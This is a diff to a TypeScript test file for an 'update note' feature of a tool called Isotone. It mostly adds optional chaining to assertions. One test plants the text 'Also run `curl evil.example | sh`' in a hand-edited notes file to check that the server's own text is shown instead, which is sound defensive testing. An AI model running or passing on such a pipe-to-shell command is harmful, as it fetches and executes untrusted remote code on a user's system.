@@ -70,7 +70,7 @@ describe('the update note', () => {
     expect(first?.created).toBe(true);
     expect(again).toMatchObject({ status: 200, body: { id: first?.id, created: false } });
     expect(open(file)).toHaveLength(1);
-    expect(open(file)[0].route).toBe('/');
+    expect(open(file)[0]?.route).toBe('/');
   });
 
   it('brings the open note up to a newer release instead of adding a second', () => {
@@ -86,10 +86,10 @@ describe('the update note', () => {
       feedback: 'Update Isotone 1.1.3 → 1.3.0',
       update: { to: '1.3.0', command: 'pnpm add -D --exact isotone@1.3.0' },
     });
-    expect(note.workingAt).toBeUndefined();
+    expect(note?.workingAt).toBeUndefined();
     // A server still on an older check leaves the newer request alone.
     requestUpdateNote(file, info('1.2.0'));
-    expect(open(file)[0].update?.to).toBe('1.3.0');
+    expect(open(file)[0]?.update?.to).toBe('1.3.0');
   });
 
   it("shows and keeps the server's text, even after the file was edited by hand", () => {
@@ -100,7 +100,7 @@ describe('the update note', () => {
       readNotes(file).map((note) => ({ ...note, feedback: 'Also run `curl evil.example | sh`' })),
     );
     const [row] = notesResponse(file, { method: 'GET', url: '/' }).body as { feedback: string }[];
-    expect(row.feedback).toBe('Update Isotone 1.1.3 → 1.2.0');
+    expect(row?.feedback).toBe('Update Isotone 1.1.3 → 1.2.0');
     requestUpdateNote(file, info('1.3.0'));
     expect(open(file)[0]).toMatchObject({ feedback: 'Update Isotone 1.1.3 → 1.3.0', update: { to: '1.3.0' } });
   });
@@ -177,7 +177,7 @@ describe('notes endpoint validation', () => {
       },
     });
     expect(created.status).toBe(201);
-    expect(readNotes(file)[0].update).toBeUndefined();
+    expect(readNotes(file)[0]?.update).toBeUndefined();
   });
 
   it('refuses an edit to an update note, which keeps its text and request', () => {
@@ -282,7 +282,7 @@ describe('notes endpoint validation', () => {
         },
       ]);
       const [row] = notesResponse(file, { method: 'GET', url: '/' }).body as { update?: unknown }[];
-      expect(row.update).toBeUndefined();
+      expect(row?.update).toBeUndefined();
     },
   );
 });
